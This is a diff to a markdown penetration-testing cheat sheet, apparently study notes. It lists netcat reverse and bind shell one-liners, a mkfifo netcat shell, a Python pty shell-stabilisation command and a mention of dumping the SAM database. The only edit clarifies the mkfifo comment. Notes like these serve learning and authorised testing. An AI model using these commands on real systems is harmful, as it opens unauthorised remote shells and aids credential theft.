@@ -444,7 +444,7 @@ hashdump: Dumps the contents of the SAM database <br>
 ### Send a shell from target device
     nc <LOCAL-IP> <PORT> -e /bin/bash (reverse)
     nc -lvnp <port> -e "cmd.exe" (bind)
-    mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (on new Linux without -e on nc)
+    mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (on new Linux without -e on nc, then attacker binds to it)
 ### Shell stabilisation
 #### Python:
     python -c 'import pty;pty.spawn("/bin/bash")'
